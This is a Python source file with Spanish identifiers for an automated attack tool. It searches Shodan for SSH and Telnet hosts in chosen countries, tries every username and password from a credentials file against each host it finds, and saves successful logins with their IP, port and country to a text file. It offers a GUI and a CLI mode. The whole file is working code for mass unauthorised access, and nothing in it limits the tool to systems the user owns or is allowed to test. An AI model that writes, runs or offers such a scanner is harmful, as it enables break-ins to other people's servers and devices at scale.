# main.py
import argparse
import socket
import paramiko
import pexpect
import shodan
from config import API_KEY, SERVICIOS, PAISES, LIMITE_BUSQUEDA
from gui import lanzar_gui

ACCESO_OK_FILE = "Acceso_exitoso.txt"

def puerto_abierto(ip, puerto):
    try:
        with socket.create_connection((ip, puerto), timeout=3):
            return True
    except:
        return False

def validar_ssh(ip, puerto, usuario, clave):
    try:
        cliente = paramiko.SSHClient()
        cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        cliente.connect(ip, port=puerto, username=usuario, password=clave, timeout=5)
        cliente.close()
        return True
    except:
        return False

def validar_telnet(ip, puerto, usuario, clave):
    try:
        child = pexpect.spawn(f'telnet {ip} {puerto}', timeout=5)
        child.expect("login:")
        child.sendline(usuario)
        child.expect("Password:")
        child.sendline(clave)
        index = child.expect([">", "#", "incorrect", pexpect.EOF, pexpect.TIMEOUT])
        child.close()
        return index in [0, 1]
    except:
        return False

# Función compatible con GUI que envía resultados progresivamente
def callback_iniciar_progresivo(on_nueva_ip):
    api = shodan.Shodan(API_KEY)
    encontrados = []
    exitosos = []
    try:
        with open("credentials.txt") as f:
            creds = [line.strip().split(":") for line in f if ":" in line]
    except FileNotFoundError:
        print("Error: El archivo credentials.txt no fue encontrado.")
        return [], []

    for servicio in SERVICIOS:
        for pais in PAISES:
            query = f"{servicio} country:{pais}"
            try:
                res = api.search(query, limit=LIMITE_BUSQUEDA)
                for match in res['matches']:
                    ip = match['ip_str']
                    port = match['port']
                    country = match.get('location', {}).get('country_name', 'Desconocido')

                    if not puerto_abierto(ip, port):
                        continue

                    nuevo = {'ip': ip, 'servicio': servicio, 'puerto': port, 'pais': country}
                    encontrados.append(nuevo)
                    on_nueva_ip(nuevo)  # actualizar en GUI

                    for user, pwd in creds:
                        acceso = False
                        if servicio == "ssh":
                            acceso = validar_ssh(ip, port, user, pwd)
                        elif servicio == "telnet":
                            acceso = validar_telnet(ip, port, user, pwd)

                        if acceso:
                            nuevo['usuario'] = user
                            nuevo['password'] = pwd
                            exitosos.append(nuevo)
                            with open(ACCESO_OK_FILE, "a") as f:
                                f.write(f"{ip}:{port} [{servicio.upper()}] - {user}:{pwd} - {country}\n")
                            break
            except Exception as e:
                print(f"[!] Error en Shodan: {e}")
    return encontrados, exitosos

def escanear_y_validar():
    # Mantener esta función para compatibilidad CLI
    return callback_iniciar_progresivo(lambda _: None)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--cli", action="store_true", help="Ejecutar en modo línea de comandos")
    args = parser.parse_args()

    if args.cli:
        print("[*] Ejecutando en modo CLI...")
        encontrados, exitosos = escanear_y_validar()
        print(f"IPs encontradas: {len(encontrados)}")
        print(f"Accesos exitosos: {len(exitosos)}")
    else:
        lanzar_gui(callback_iniciar_progresivo)

if __name__ == "__main__":
    main()
